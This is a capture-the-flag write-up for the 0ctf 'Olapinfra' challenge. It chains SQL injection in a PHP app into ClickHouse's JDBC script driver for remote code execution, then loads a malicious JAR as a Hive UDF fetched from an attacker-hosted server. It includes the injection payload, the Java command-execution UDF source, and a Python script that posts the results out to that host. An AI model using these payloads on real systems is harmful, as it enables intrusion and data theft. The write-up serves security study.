<style>
    .caption {
        display:block;
        float:right;
    }
</style>


# Olapinfra writeup
## Summary
Part 1: SQL injection on `web` => Clickhouse `jdbc` script driver => RCE<br>
Part 2: Create exec function in `hive` => RCE<br>

## Overview
`web`: PHP web server that executes a `SELECT` db query against `clickhouse`. We control part of the query. <br>
`clickhouse`: Essentially just a DBMS. Set up to query `hive` for the `u_data` table. Not connected to the outside network. <br>
`hive`: A data warehouse that stores the `u_data` table. Uses `hadoop` to actually store said data. Not connected to the outside network. <br>
`hadoop`: Distributed storage that both `clickhouse` and `hive` rely on. Not connected to the outside network. <br>

## Process (part 1)
See SQL injection on `web` against `clickhouse`, spend a couple hours understanding how the whole chall is tied together.

```php
$statement = $db->select('SELECT * FROM u_data WHERE ' . $_GET['query'] . ' LIMIT 10');
```
<span class="caption">_the SQL vuln in `web`_</span>

So, `clickhouse` has its own SQL language, with a few extra functions defined. There were some interesting ones like `url()`, but the most interesting one is `jdbc-bridge`, used in the `Dockerfile` for the container, especially because ClickHouse has a page on security, so an RCE vuln against default ClickHouse would amount to a 0-day, which'd be unlikely. <br>

```Dockerfile
FROM clickhouse/jdbc-bridge:2.1.0
```
<span class="caption">_non-default stuff is usually kinda sus_</span>

![Bridge Diagram](https://user-images.githubusercontent.com/4270380/103492828-a06d1200-4e68-11eb-9287-ef830f575d3e.png)
<span class="caption">_Diagram on the JDBC bridge Github page_</span>

Turns out, the `script` driver accepts some weird mix between `javascript` and `java`, and with this payload, we get part 1:

```python
sqlinject=f"""
1=1 UNION ALL SELECT results, results, results, results FROM jdbc('script', `{script}`)
""".strip()
    
r = requests.get(f"{CHALL_URL}", params={
    "query": sqlinject
})
```

The script:

```javascript
var p = new java.lang.ProcessBuilder["(java.lang.String[])"](["/bin/sh", "-c", "/readflag"]).start();
var builder = new java.lang.StringBuilder();
var line = null;
while ((line = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())).readLine()) != null) {{
    builder.append(line);
}}
var res = builder.toString();
```

## Process (part 2)
With RCE on `clickhouse`, we can start by assuming that we can make arbitrary connections to `hive` and `hadoop` (i.e., change the docker-compose network for `hive` to `outer-network`). `hive` has its own extended SQL language, called HiveQL, which also defines functions not found in standard SQL (User-Defined Functions, or UDFs).<br>

There's a rudimentary blacklist against what UDFs you can use, defined in `hive-site.xml`, which prevents easy ways of executing arbitrary Java code. Hive does allow creating functions from JARs.

```xml
    <property>
        <name>hive.server2.builtin.udf.blacklist</name>
        <value>reflect,reflect2,java_method</value>
    </property>
```
<span class="caption">_XML definition for UDF blacklist_</span><br>

```sql
CREATE FUNCTION [db_name.]function_name AS class_name
  [USING JAR|FILE|ARCHIVE 'file_uri' [, JAR|FILE|ARCHIVE 'file_uri'] ];
```
<span class="caption">_file\_uri??_</span>

So, we followed instructions [here](https://docs.cloudera.com/data-warehouse/cloud/querying-data/topics/hive_create_udf_class.html), exposed the JAR on a perl web server, sent a query to `hive` to create the function, and then executed it. This gave us RCE on part 2, so the final bit to complete was actually doing everything from part 1's RCE on `clickhouse`.<br>

<details closed>
    <summary>Source for JAR code</summary>

        package com.example;

        import org.apache.hadoop.hive.ql.exec.UDFArgumentException;
        import org.apache.hadoop.hive.ql.metadata.HiveException;
        import org.apache.hadoop.hive.ql.udf.generic.GenericUDF;
        import org.apache.hadoop.hive.serde2.objectinspector.ObjectInspector;
        import org.apache.hadoop.hive.serde2.objectinspector.primitive.PrimitiveObjectInspectorFactory;
        import org.apache.hadoop.io.Text;

        import avro.shaded.com.google.common.collect.ImmutableBiMap.Builder;

        import java.lang.ProcessBuilder;

        public class Execute extends GenericUDF {
        private final Text output = new Text();

        @Override
        public ObjectInspector initialize(ObjectInspector[] arguments) throws UDFArgumentException {
            checkArgsSize(arguments, 1, 1);
            checkArgPrimitive(arguments, 0);
            ObjectInspector outputOI = PrimitiveObjectInspectorFactory.writableStringObjectInspector;
            return outputOI;
        }

        @Override
        public Object evaluate(DeferredObject[] arguments) throws HiveException {
            String cmd = arguments[0].get().toString();
            try {
            ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));
            Process p = pb.start();
            p.waitFor();
            String result = "";
            StringBuilder builder = new java.lang.StringBuilder();
            String line = null;
            while ((line = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())).readLine()) != null) {
                builder.append(line);
            }
            String res = builder.toString();
            output.set(res);
            } catch (Exception e) {
            output.set(e.toString());
            }
            return output;
        }

        @Override
        public String getDisplayString(String[] children) {
            return getStandardDisplayString("TYPEOF", children, ",");
        }
        }
</details>

<details closed>
    <summary>Getting RCE on Hive</summary>

    from pyhive import hive
    import socket

    domain = "web-server-url"
    url = f"https://{domain}"
    url = f"{url}/demo/target/demo-1.0-SNAPSHOT.jar"
    con=hive.Connection(host="localhost",port=10000,username="default")
    cursor = con.cursor()
    try:
        stmt = f'create function exec as "com.example.Execute" using jar "{url}"'
        cursor.execute(stmt)
    except:
        pass # already exists
    stmt = f'select exec("/readflag")'
    cursor.execute(stmt)
    res = (cursor.fetchall())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((domain, 80))
    s.sendall(f"""POST / HTTP/1.1
    Content-Type: application/json
    Content-Length: {len(res[0][0])}

    {res[0][0]}
    """)
</details>

<br>

So, we converted the above script to a binary (`PyInstaller`), sent it over the RCE vector, together with the JAR and an HTTP server, had `hive` fetch the function JAR from `clickhouse`, and got RCE on part 2.<br>

`0ctf{the_world_is_chaos_and_so_do_this_challenge}`<br>

(Btw, because everything but `web` is on the inner network, they can't download anything publicly accessible, and because the SQL injection vector is in a query param, we can only send about 4kB of data per connection. The binaries alone were 3MB...)

## Sources:
- https://github.com/ClickHouse/clickhouse-jdbc-bridge (ClickHouse JDBC bridge)
- https://cwiki.apache.org/confluence/display/Hive/ (Hive docs)
- https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DDL#:~:text=Permanent+Functions (Hive docs for creating UDFs)
